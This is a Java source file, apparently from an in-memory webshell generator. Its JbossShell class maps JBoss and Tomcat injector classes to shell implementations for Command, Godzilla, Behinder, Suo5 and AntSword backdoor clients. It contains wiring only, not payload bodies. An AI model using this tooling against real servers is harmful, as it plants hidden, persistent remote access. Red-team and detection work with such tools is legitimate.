package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.jboss.injector.JbossFilterInjector;
import com.reajason.javaweb.memshell.jboss.injector.JbossListenerInjector;
import com.reajason.javaweb.memshell.jboss.injector.JbossValveInjector;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordValve;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderValve;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Valve;
import com.reajason.javaweb.memshell.tomcat.injector.TomcatContextValveAgentInjector;
import com.reajason.javaweb.memshell.tomcat.injector.TomcatFilterChainAgentInjector;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class JbossShell extends AbstractShell {

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(FILTER, JbossFilterInjector.class)
                .addInjector(LISTENER, JbossListenerInjector.class)
                .addInjector(VALVE, JbossValveInjector.class)
                .addInjector(ShellType.AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command))
                .addShellClass(VALVE, CommandValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla))
                .addShellClass(VALVE, GodzillaValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder))
                .addShellClass(VALVE, BehinderValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5))
                .addShellClass(VALVE, Suo5Valve.class)
                .build());

        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword))
                .addShellClass(VALVE, AntSwordValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                .build());
    }
}